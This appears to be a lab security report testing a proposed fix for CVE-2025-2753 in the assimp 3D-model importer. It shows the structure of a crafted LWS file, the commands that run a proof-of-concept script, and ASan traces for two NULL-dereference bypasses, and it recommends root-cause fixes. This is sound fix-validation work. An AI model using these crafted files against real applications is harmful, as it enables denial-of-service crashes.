# Bypass Analysis: CVE-2025-2753

## Bypass Status: ✅ CONFIRMED — Fix is Incomplete (2 bypasses found)

---

## Fix Under Test

Since CVE-2025-2753 has **no official fix** (unfixed as of v6.0.4), we implemented and tested the **recommended fix** from the vulnerability analysis:

1. **LWSLoader.cpp** — Value-initialize camera and light arrays:
   ```cpp
   // Before (vulnerable):
   master->mCameras = new aiCamera *[master->mNumCameras = num_camera];
   master->mLights = new aiLight *[master->mNumLights = num_light];

   // After (fix):
   master->mCameras = new aiCamera *[master->mNumCameras = num_camera]();  // zero-init
   master->mLights = new aiLight *[master->mNumLights = num_light]();      // zero-init
   ```

2. **SceneCombiner.cpp** — Add null-check in `CopyPtrArray`:
   ```cpp
   // Before (vulnerable):
   SceneCombiner::Copy(&dest[i], src[i]);

   // After (fix):
   if (src[i]) { SceneCombiner::Copy(&dest[i], src[i]); } else { dest[i] = nullptr; }
   ```

This fix addresses the immediate crash in `CopyPtrArray → SceneCombiner::Copy()` by converting garbage pointers to NULL and skipping NULL entries during copy. However, **two other code paths still dereference the NULL pointers**, causing identical denial-of-service crashes.

---

## Bypass Hypothesis

The value-initialization fix converts uninitialized heap garbage (e.g., `0xbebebebebebebebe`) to NULL (`0x0`) in unfilled array slots. The CopyPtrArray null-check prevents the crash in that specific function.

**However**, the NULL pointers in `mCameras[]` and `mLights[]` are accessed by at least two other code paths that lack NULL checks:

1. **`MakeLeftHandedProcess::ProcessCamera(aiCamera* pCam)`** at `ConvertToLHProcess.cpp:235` — Called at `LWSLoader.cpp:895` (line 118 of Execute), which runs **before** `MergeScenes`. It dereferences `pCam->mLookAt` without checking if `pCam` is NULL.

2. **`ValidateDSProcess::DoValidationEx()`** at `ValidateDataStructure.cpp:151` — Called during the Importer post-processing pipeline **after** `InternReadFile` returns the scene. The inner loop compares `parray[i]->mName == parray[a]->mName` where `parray[a]` can be NULL.

Neither of these code paths was modified by the fix.

---

## Bypass Method

### Bypass 1: Camera NULL Dereference via ProcessCamera

**Technique**: 151-byte hand-crafted LWS file with circular object references creating an unreachable camera node.

**File structure**:
```
LWSC
1

AddNullObject root_node         ← Object 0 (root, no parent)

AddNullObject circular_node_b   ← Object 1
ParentObject 2                  ← child of Object 2

AddNullObject circular_node_c   ← Object 2
ParentObject 1                  ← child of Object 1 (circular!)

AddCamera                       ← Camera 0
ParentObject 1                  ← child of Object 1 (unreachable)
```

**Why it works**: After parent resolution, Objects 1 and 2 form a circular reference — neither is a root node. Camera 0 is a child of Object 1, which is unreachable from the root (Object 0). `num_camera=1` is set during parsing, but `BuildGraph` never visits Camera 0. With value-initialization, `mCameras[0] = NULL`. At line 895, `MakeLeftHandedProcess::Execute()` iterates `mNumCameras` entries and calls `ProcessCamera(mCameras[0])` → `ProcessCamera(NULL)` → dereferences `pCam->mLookAt` → **SEGV at address 0x000000000404** (NULL struct offset).

### Bypass 2: Light NULL Dereference via ValidateDSProcess

**Technique**: The original 661-byte crash.lws file from GitHub issue #6014.

**Why it works**: The fix successfully prevents the crash in `CopyPtrArray<aiLight>` (the CopyPtrArray null-check skips NULL light entries). `MergeScenes` completes without crashing. However, the returned scene has `mNumLights > 0` with NULL entries in `mLights[]`. When the Importer runs the `ValidateDSProcess` post-processor, `DoValidationEx<aiLight>()` iterates all `mNumLights` entries. In the duplicate-name-check inner loop at line 151:
```cpp
if (parray[i]->mName == parray[a]->mName) {  // parray[a] is NULL → SEGV
```
The NULL pointer is dereferenced → **SEGV at address 0x000000000000**.

---

## Bypass Script

**Location**: `poc/bypass_poc.py`

**Usage**:
```bash
cd poc
python3 bypass_poc.py cve-2025-2753-patched cve-2025-2753-vulnerable
```

---

## Test Results

### Bypass 1: Camera — MakeLeftHandedProcess::ProcessCamera

| Target | Build | Crashed | Address | Crash Location |
|--------|-------|---------|---------|----------------|
| **Patched** | ASan | ✅ YES | `0x000000000404` (NULL+offset) | `ProcessCamera` (ConvertToLHProcess.cpp:235) |
| **Patched** | Release | ✅ YES | SIGSEGV (exit 139) | Same |
| Vulnerable | ASan | ✅ YES | `0x17d7d7e7d7d7d858` (garbage) | `ProcessCamera` (ConvertToLHProcess.cpp:235) |
| Vulnerable | Release | ✅ YES | SIGSEGV (exit 139) | Same |

**ASan output (patched container)**:
```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==42==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000404
==42==The signal is caused by a READ memory access.
==42==Hint: address points to the zero page.
    #0 aiVector3t<float> operator*<float>(...) vector3.inl:248
    #1 Assimp::MakeLeftHandedProcess::ProcessCamera(aiCamera*) ConvertToLHProcess.cpp:235
    #2 Assimp::MakeLeftHandedProcess::Execute(aiScene*) ConvertToLHProcess.cpp:118
    #3 Assimp::LWSImporter::InternReadFile(...) LWSLoader.cpp:895
```

### Bypass 2: Lights — ValidateDSProcess::DoValidationEx

| Target | Build | Crashed | Address | Crash Location |
|--------|-------|---------|---------|----------------|
| **Patched** | ASan | ✅ YES | `0x000000000000` (NULL) | `DoValidationEx<aiLight>` (ValidateDataStructure.cpp:151) |
| **Patched** | Release | ✅ YES | SIGSEGV (exit 139) | Same |
| Vulnerable | ASan | ✅ YES | `0x17d7d7e7d7d7d7d7` (garbage) | `CopyPtrArray<aiLight>` (SceneCombiner.cpp) — ORIGINAL |
| Vulnerable | Release | ✅ YES | SIGSEGV (exit 139) | Same |

**ASan output (patched container)**:
```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==56==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
==56==The signal is caused by a READ memory access.
==56==Hint: address points to the zero page.
    #0 aiString::operator==(aiString const&) const types.h:346
    #1 ValidateDSProcess::DoValidationEx<aiLight>(...) ValidateDataStructure.cpp:151
    #2 ValidateDSProcess::DoValidationWithNameCheck<aiLight>(...)
    #3 ValidateDSProcess::Execute(aiScene*) ValidateDataStructure.cpp:217
    #4 BaseProcess::ExecuteOnScene(Importer*) BaseProcess.cpp:82
    #5 Importer::ReadFile(...) Importer.cpp:731
```

---

## Severity Assessment

### Impact: **Same as original CVE (DoS — crash)**

The bypass produces identical denial-of-service impact: any application using assimp to process the malicious LWS file will crash with SIGSEGV. The fix only changes **where** the crash occurs (NULL dereference instead of garbage dereference), not **whether** it occurs.

### CVSS: **6.3 (MEDIUM)** — unchanged from original

The attack vector, complexity, privileges, user interaction, scope, and CIA impact are all identical to the original CVE-2025-2753. The bypass does not enable any new capabilities beyond what the original vulnerability provided.

### Constitutes a New Vulnerability?

**Borderline.** The bypasses demonstrate that the recommended fix for CVE-2025-2753 is insufficient, but the root cause is the same (CWE-457 — use of uninitialized/null pointer array). They could be considered:

- **Same CVE (expanded scope)**: The fix for CVE-2025-2753 should be updated to also address ProcessCamera and ValidateDSProcess NULL handling
- **New CVE (if fix is officially released)**: If the value-initialization fix is released as an official patch and claimed to resolve CVE-2025-2753, then the remaining NULL dereference paths could warrant a separate advisory

Since no official fix exists yet, the most accurate characterization is: **the recommended fix approach is insufficient and needs expansion**.

---

## Recommended Additional Fix

The **root cause fix** should address the count-vs-fill mismatch directly, rather than adding NULL checks everywhere:

### Option A: Post-traversal count adjustment (recommended)
```cpp
// After BuildGraph() completes in LWSLoader.cpp (after line 877):
// Adjust mNumCameras/mNumLights to actual filled count
master->mNumCameras = static_cast<unsigned int>(cams - master->mCameras);
master->mNumLights = static_cast<unsigned int>(lights - master->mLights);
```
This ensures `mNumCameras`/`mNumLights` matches the actual number of valid entries. No downstream code path will attempt to access unfilled slots.

### Option B: Comprehensive NULL checks (defense-in-depth)
In addition to value-initialization + CopyPtrArray null-check:
1. `MakeLeftHandedProcess::ProcessCamera()` — add `if (!pCam) return;`
2. `ValidateDSProcess::DoValidationEx()` — skip NULL entries in inner loop
3. `MergeScenes` direct iteration — check `(*cur)->mLights[i]` for NULL
4. All consumers of `mLights[]`, `mCameras[]` arrays

### Option C: Use std::vector (eliminates entire vulnerability class)
Replace all `new Type*[count]` allocations with `std::vector<Type*>`, using `push_back` during BuildGraph instead of pointer arithmetic. This eliminates uninitialized memory and count mismatches entirely.

---

## Confidence Level

**HIGH** — Both bypasses are:
- Reproducible across ASan and release builds
- Demonstrated with different crash addresses (NULL vs garbage) proving the fix partially works
- Triggered through different code paths than the original vulnerability
- Tested on both patched and vulnerable containers showing differential behavior

The fix is **partially effective** (eliminates the CopyPtrArray crash path) but **incomplete** (at least 2 other crash paths remain).

---

## Lab Artifacts

| Artifact | Path |
|----------|------|
| Bypass PoC script | `poc/bypass_poc.py` |
| Patched Dockerfile | `Dockerfile.patched` |
| Docker Compose (updated) | `docker-compose.yml` |
| Camera bypass LWS | Generated at runtime (151 bytes, clean ASCII) |
| Light bypass LWS | `poc/crash.lws` (original 661-byte file) |
| Fix patch reference | `fix_cve_2025_2753.patch` |

### Patched container:
```bash
# Build and start
docker compose up -d patched

# Run bypass PoC
cd poc
python3 bypass_poc.py cve-2025-2753-patched cve-2025-2753-vulnerable
```
